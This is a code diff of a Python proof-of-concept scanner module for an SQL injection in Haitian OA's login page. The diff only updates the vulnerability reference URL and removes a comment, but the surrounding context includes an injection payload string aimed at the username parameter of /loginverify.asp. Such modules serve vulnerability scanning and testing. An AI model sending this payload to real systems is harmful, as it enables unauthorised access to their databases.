@@ -14,7 +14,7 @@ class Vuln(ABVuln):
         海天网络协同办公系统(海天OA)，是一套高质量、高效率、智能化的基于B/S结构的办公系统。产品特色：图形化流程设计、电子印章及手写签名痕迹保留等功能、灵活的工作流处理模式支持、完善的角色权限管理 、严密的安全性管理 、完备的二次开发特性。
         HaitianOA系统 /loginverify.asp 参数过滤不完整，导致SQL注入漏洞。
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=061977'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = '海天OA'  # 漏洞应用名称
@@ -48,7 +48,6 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            # http://www.wooyun.org/bugs/wooyun-2010-061977，http://www.wooyun.org/bugs/wooyun-2010-061213
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/loginverify.asp?Digest=&urlFrom=&password=admin&Memo=1&username=1'/**/AND/**/1="
